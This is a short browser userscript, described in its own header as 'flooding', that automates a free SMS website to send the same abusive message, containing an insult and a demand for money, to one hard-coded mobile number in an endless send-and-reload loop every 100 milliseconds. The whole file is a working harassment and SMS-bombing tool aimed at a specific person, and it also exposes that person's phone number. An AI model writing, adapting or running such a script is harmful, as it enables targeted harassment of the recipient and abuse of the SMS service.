// ==UserScript==
// @name           auto sms to RINKU
// @namespace      MANDE3P
// @description    flooding
// @include        http://*freesms8.com/quickSMS.aspx
// @include        http://*freesms8.com/QuickSent.aspx
// @include        http://*freesms8.com/*
// ==/UserScript==

if(document.location=="http://www.freesms8.com/quickSMS.aspx"||document.location=="http://www.freesms8.com/QuickSMS.aspx")
{
document.getElementById('ctl00_BodyPlaceHolder_MobileNumber').value=9541244816;
document.getElementById('ctl00_BodyPlaceHolder_SMSText').value='TU PHONE CHUK - NA CHUK BENCHO , SHAAM TU MAINU PAISE CHAHIDE NE';
void(0);
document.getElementById('ctl00_BodyPlaceHolder_SendButton').click();
}

if(document.location=="http://www.freesms8.com/QuickSent.aspx")
{
setTimeout('document.location="http://www.freesms8.com/quickSMS.aspx"',100);
}
